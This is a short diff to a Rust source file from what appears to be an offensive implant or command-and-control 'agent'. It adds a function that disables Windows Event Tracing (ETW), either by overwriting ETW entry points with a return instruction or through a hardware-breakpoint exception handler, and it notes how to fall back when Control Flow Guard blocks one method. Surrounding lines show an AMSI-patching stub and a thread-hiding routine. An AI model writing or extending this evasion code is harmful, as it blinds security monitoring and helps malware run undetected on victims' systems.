@@ -200,6 +200,30 @@ pub unsafe fn patch_amsi() {
 /// No-op stub on non-Windows; always safe to call.
 pub unsafe fn patch_amsi() {}
 
+/// Apply the ETW bypass using the method configured in the agent config.
+///
+/// Defaults to [`common::config::EtwPatchMethod::Direct`] when `method` is
+/// `None`, which overwrites the ETW function entry points with `ret` (0xC3).
+/// When `Hwbp` is selected the existing hardware-breakpoint VEH approach is
+/// used instead.  Both approaches may be layered: if direct patching fails
+/// (e.g. `VirtualProtect` is blocked by CFG), the caller should fall back to
+/// `setup_hardware_breakpoints()` independently.
+///
+/// # Safety
+///
+/// Modifies process state; see [`crate::etw_patch::patch_etw`] and
+/// [`setup_hardware_breakpoints`] for their respective safety requirements.
+pub unsafe fn setup_etw_patch(method: Option<&common::config::EtwPatchMethod>) {
+    use common::config::EtwPatchMethod;
+    match method.unwrap_or(&EtwPatchMethod::Direct) {
+        EtwPatchMethod::Direct => crate::etw_patch::patch_etw(),
+        EtwPatchMethod::Hwbp => {
+            #[cfg(windows)]
+            setup_hardware_breakpoints();
+        }
+    }
+}
+
 #[cfg(windows)]
 pub fn hide_current_thread() {
     unsafe {
